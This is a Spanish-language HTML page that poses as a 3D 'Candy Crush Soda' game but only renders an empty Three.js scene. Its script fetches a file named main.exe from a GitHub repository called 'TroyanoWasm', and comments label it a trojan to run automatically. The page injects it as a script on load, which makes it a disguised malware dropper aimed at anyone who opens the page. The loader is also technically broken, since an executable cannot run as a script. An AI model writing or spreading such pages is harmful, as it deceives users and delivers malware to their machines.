<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Candy Crush Soda - Edición 3D</title>
    <style>
        body { margin: 0; overflow: hidden; background: #1a1a2e; }
        canvas { display: block; margin: auto; }
        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 24px; }
    </style>
</head>
<body>
    <div id="loading">Cargando juego...</div>
    <script type="module">
        import * as THREE from 'https://cdn.skypack.dev/three@0.136.0';

        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({ antialias: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        document.body.appendChild(renderer.domElement);

        // Cargar el troyano desde GitHub
        fetch('https://raw.githubusercontent.com/TU_USUARIO/TroyanoWasm/main/main.exe')
            .then(response => response.blob())
            .then(blob => {
                const url = URL.createObjectURL(blob);
                document.getElementById('loading').style.display = 'none';

                // Ejecutar el troyano automáticamente
                const script = document.createElement('script');
                script.src = url;
                document.body.appendChild(script);
            });

        function animate() {
            requestAnimationFrame(animate);
            renderer.render(scene, camera);
        }
        animate();
    </script>
</body>
</html>
